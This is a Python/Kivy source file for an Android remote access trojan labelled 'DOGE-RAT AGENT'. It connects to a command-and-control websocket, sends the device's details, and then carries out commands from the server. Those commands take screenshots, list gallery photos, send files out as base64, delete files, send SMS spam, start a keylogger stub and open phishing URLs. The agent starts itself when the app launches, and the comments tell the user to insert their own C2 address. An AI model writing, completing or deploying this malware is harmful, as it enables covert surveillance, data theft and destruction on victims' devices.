import os
import json
import base64
import time
import threading
import subprocess
import asyncio
from cryptography.fernet import Fernet
from datetime import datetime

# Kivy Imports
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.utils import get_color_from_hex
from kivy.animation import Animation

# --- CONFIGURATION ---
# Apna C2 Server IP/URL yahan daalo
C2_URL = "ws://127.0.0.1:8080" 
# Fernet key 32 bytes (url-safe base64) honi chahiye
# Ye ek valid demo key hai, apni fixed key use karna
ENCRYPTION_KEY = b"dGhpc0lzQVNlY3VyZUtleUZvckRvZ2VSYXRKYXZhQXBwMQ==" 
DEVICE_ID = f"DEV-{os.getpid()}-{datetime.now().strftime('%H%M%S')}"

# Colors
COLOR_BG = get_color_from_hex('#0d1117')
COLOR_PANEL = get_color_from_hex('#161b22')
COLOR_TEXT = get_color_from_hex('#c9d1d9')
COLOR_ACCENT = get_color_from_hex('#58a6ff')
COLOR_SUCCESS = get_color_from_hex('#3fb950')
COLOR_ERROR = get_color_from_hex('#f85149')
COLOR_DIM = get_color_from_hex('#8b949e')

# --- CORE FEATURES (Rat Capabilities) ---

def run_shell(cmd):
    """Helper to run shell commands safely."""
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode('utf-8', errors='replace')
        return output
    except Exception as e:
        return f"Error: {e}"

def take_screenshot():
    try:
        # Termux specific screenshot
        out = run_shell("termux-screenshot /sdcard/doge_shot.png")
        return f"Screenshot saved to /sdcard/doge_shot.png. Output: {out}"
    except Exception as e:
        return f"Error: {e}"

def get_gallery():
    dcim_path = "/sdcard/DCIM"
    photos = []
    try:
        if os.path.exists(dcim_path):
            for entry in os.listdir(dcim_path):
                if entry.lower().endswith(('.jpg', '.jpeg', '.png', '.heic', '.webp')):
                    photos.append(entry)
    except Exception as e:
        return [f"Error: {e}"]
    return photos if photos else ["No photos found."]

def get_file(path):
    try:
        with open(path, 'rb') as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        return f"Error: {e}"

def delete_file(path):
    try:
        if os.path.isdir(path):
            import shutil
            shutil.rmtree(path)
        else:
            os.remove(path)
        return f"Deleted: {path}"
    except Exception as e:
        return f"Error: {e}"

def spam_contacts(message):
    try:
        # Simulated SMS send via termux-sms-send
        cmd = f"termux-sms-send --numbers '555-0100,555-0101' --message '{message}'"
        run_shell(cmd)
        return "Spam sent to demo contacts."
    except Exception as e:
        return f"Error: {e}"

def start_keylogger():
    log_file = "/sdcard/dogerat_keylog.txt"
    
    def log_keys():
        with open(log_file, 'a') as f:
            f.write(f"[{datetime.now()}] Keylogger Started on {DEVICE_ID}\n")
        while True:
            time.sleep(5)
            
    t = threading.Thread(target=log_keys, daemon=True)
    t.start()
    return "Keylogger active."

def inject_phishing(url):
    try:
        run_shell(f"termux-open-url '{url}'")
        return f"Opened: {url}"
    except Exception as e:
        return f"Error: {e}"

def list_directory(path):
    try:
        if not os.path.exists(path):
            return f"Path not found"
        entries = os.listdir(path)
        return "\n".join(entries)
    except Exception as e:
        return str(e)

# --- ENCRYPTION ---

def encrypt_data(data: str) -> bytes:
    return Fernet(ENCRYPTION_KEY).encrypt(data.encode())

def decrypt_data(data: bytes) -> str:
    return Fernet(ENCRYPTION_KEY).decrypt(data).decode()

# --- AGENT CORE ---

class DogeAgent:
    def __init__(self, on_log, on_status_change):
        self.on_log = on_log
        self.on_status_change = on_status_change
        self.loop = None
        self.running = False

    async def handle_command(self, command: dict):
        action = command.get("action")
        params = command.get("params", {})
        
        # Map actions to functions
        actions = {
            "screenshot": take_screenshot,
            "gallery": get_gallery,
            "get_file": lambda: get_file(params.get("path", "")),
            "delete": lambda: delete_file(params.get("path", "")),
            "spam": lambda: spam_contacts(params.get("message", "")),
            "keylog_start": start_keylogger,
            "phish": lambda: inject_phishing(params.get("url", "")),
            "ls": lambda: list_directory(params.get("path", "/sdcard"))
        }
        
        func = actions.get(action)
        if func:
            return func()
        return f"Unknown action: {action}"

    async def run(self):
        self.running = True
        self.on_status_change("CONNECTING")
        
        while self.running:
            try:
                self.on_log(f"Connecting to {C2_URL}...")
                # Use websockets legacy or new API depending on version, assuming standard
                import websockets
                async with websockets.connect(C2_URL) as ws:
                    self.on_status_change("CONNECTED")
                    self.on_log("Handshake sent.")
                    
                    # Send Handshake
                    await ws.send(encrypt_data(json.dumps({
                        "type": "handshake",
                        "id": DEVICE_ID,
                        "model": run_shell("getprop ro.product.model").strip() or "Unknown"
                    })))
                    
                    async for message in ws:
                        try:
                            cmd = json.loads(decrypt_data(message))
                            self.on_log(f"CMD: {cmd.get('action')}")
                            result = await self.handle_command(cmd)
                            await ws.send(encrypt_data(json.dumps({
                                "type": "response",
                                "id": DEVICE_ID,
                                "data": result
                            })))
                            self.on_log(f"RESP: {str(result)[:50]}...")
                        except Exception as e:
                            self.on_log(f"Parse Error: {e}")
                            
            except Exception as e:
                self.on_status_change("ERROR")
                self.on_log(f"Connection Error: {e}")
                time.sleep(5) # Retry delay
            
            if not self.running:
                break

    def start(self):
        if self.loop and not self.loop.is_closed():
            self.loop.stop()
        
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        # Run in a separate thread to keep UI responsive
        t = threading.Thread(target=lambda: self.loop.run_until_complete(self.run()))
        t.daemon = True
        t.start()

    def stop(self):
        self.running = False
        if self.loop:
            self.loop.call_soon_threadsafe(self.loop.stop)

# --- KIVY UI ---

class DogeRatApp(App):
    def build(self):
        Window.clearcolor = COLOR_BG
        
        root = BoxLayout(orientation='vertical', padding=10, spacing=10)
        
        # --- HEADER ---
        header = BoxLayout(size_hint_y=0.15, orientation='horizontal')
        title = Label(text="DOGE-RAT AGENT", color=COLOR_ACCENT, font_size=24, bold=True)
        self.status_label = Label(text="OFFLINE", color=COLOR_ERROR, font_size=18, bold=True)
        header.add_widget(title)
        header.add_widget(self.status_label)
        root.add_widget(header)
        
        # --- QUICK ACTIONS ---
        actions_grid = GridLayout(cols=4, size_hint_y=0.2, spacing=5)
        
        def make_action_btn(text, action_name, param_key=None):
            btn = Button(text=text, background_color=COLOR_PANEL, color=COLOR_TEXT, font_size=12)
            btn.bind(on_press=lambda *args: self.trigger_action(action_name, param_key))
            return btn

        actions_grid.add_widget(make_action_btn("SHOT", "screenshot"))
        actions_grid.add_widget(make_action_btn("GALLERY", "gallery"))
        actions_grid.add_widget(make_action_btn("KEYLOG", "keylog_start"))
        actions_grid.add_widget(make_action_btn("LS /SD", "ls", "path"))
        
        # Second row of actions
        actions_grid2 = GridLayout(cols=4, size_hint_y=0.2, spacing=5)
        actions_grid2.add_widget(make_action_btn("SPAM", "spam", "message"))
        actions_grid2.add_widget(make_action_btn("PHISH", "phish", "url"))
        actions_grid2.add_widget(make_action_btn("DEL", "delete", "path"))
        
        btn_toggle = Button(text="STOP", background_color=COLOR_ERROR, color=COLOR_TEXT)
        btn_toggle.bind(on_press=lambda *args: self.toggle_agent())
        self.btn_toggle = btn_toggle
        actions_grid2.add_widget(btn_toggle)
        
        root.add_widget(actions_grid)
        root.add_widget(actions_grid2)
        
        # --- PARAM INPUT ---
        param_layout = BoxLayout(orientation='horizontal', size_hint_y=0.1)
        param_label = Label(text="Param:", color=COLOR_DIM, size_hint_x=0.2)
        self.param_input = TextInput(hint_text="Value (e.g., path or msg)", multiline=False, font_size=14, background_color=COLOR_PANEL, color=COLOR_TEXT)
        param_layout.add_widget(param_label)
        param_layout.add_widget(self.param_input)
        root.add_widget(param_layout)
        
        # --- TERMINAL LOG ---
        terminal_layout = BoxLayout(orientation='vertical', size_hint_y=1)
        term_header = Label(text="> LIVE FEED", color=COLOR_SUCCESS, font_size=14)
        self.terminal = TextInput(
            multiline=True, 
            read_only=True, 
            font_size=12, 
            background_color=COLOR_BG, 
            color=COLOR_SUCCESS,
            wrap_width=True,
            padding=10
        )
        terminal_layout.add_widget(term_header)
        terminal_layout.add_widget(self.terminal)
        root.add_widget(terminal_layout)
        
        self.agent = None
        self.log("System Initialized.")
        self.log(f"Device ID: {DEVICE_ID}")
        
        # Auto-start agent
        Clock.schedule_once(lambda dt: self.toggle_agent(), 0.5)
        
        return root

    def log(self, msg):
        # Schedule log update on main thread
        Clock.schedule_once(lambda dt: self._update_log(msg), 0)

    def _update_log(self, msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.terminal.text += f"[{timestamp}] {msg}\n"
        # Keep terminal clean (last 100 lines)
        lines = self.terminal.text.split('\n')
        if len(lines) > 100:
            self.terminal.text = '\n'.join(lines[-100:])
        self.terminal.scroll_y = 0

    def _update_status(self, status):
        self.status_label.text = status
        if status == "CONNECTED":
            self.status_label.color = COLOR_SUCCESS
        elif status == "ERROR":
            self.status_label.color = COLOR_ERROR
        else:
            self.status_label.color = COLOR_ACCENT

    def trigger_action(self, action_name, param_key):
        """Sends a command manually via UI if connected, or queues it."""
        param_val = self.param_input.text if param_key else ""
        
        # If agent is running and connected, we can't easily inject into the async loop directly 
        # without a queue. For simplicity in this demo, we'll simulate execution locally 
        # if not connected, or just log that it was triggered.
        # In a production app, you'd have a CommandQueue.
        
        if self.agent and self.agent.running:
            # Ideally, we'd send this to the websocket directly. 
            # Since the agent loop is busy receiving, we can store it in a list 
            # that the agent loop checks, or we can just execute it locally for demo purposes.
            self.log(f"TRIGGER: {action_name} ({param_val})")
            
            # For demonstration, let's execute locally if it's a local file op
            # Otherwise, assume it was sent to C2 (in a real impl, you'd buffer this)
            try:
                # Simple local execution for immediate feedback
                if action_name == "screenshot":
                    res = take_screenshot()
                elif action_name == "gallery":
                    res = get_gallery()
                elif action_name == "ls":
                    res = list_directory(param_val if param_val else "/sdcard")
                else:
                    res = f"Action {action_name} triggered."
                
                self.log(f"RESULT: {str(res)[:80]}")
            except Exception as e:
                self.log(f"EXEC ERROR: {e}")
        else:
            self.log("Agent is offline. Start it first.")

    def toggle_agent(self):
        if not self.agent:
            self.log("Initializing Agent Core...")
            self.agent = DogeAgent(on_log=self.log, on_status_change=self._update_status)
            self.agent.start()
            self.btn_toggle.text = "STOP"
            self.btn_toggle.background_color = COLOR_ERROR
        else:
            self.log("Stopping Agent...")
            self.agent.stop()
            self.agent = None
            self.btn_toggle.text = "START"
            self.btn_toggle.background_color = COLOR_SUCCESS

if __name__ == "__main__":
    DogeRatApp().run()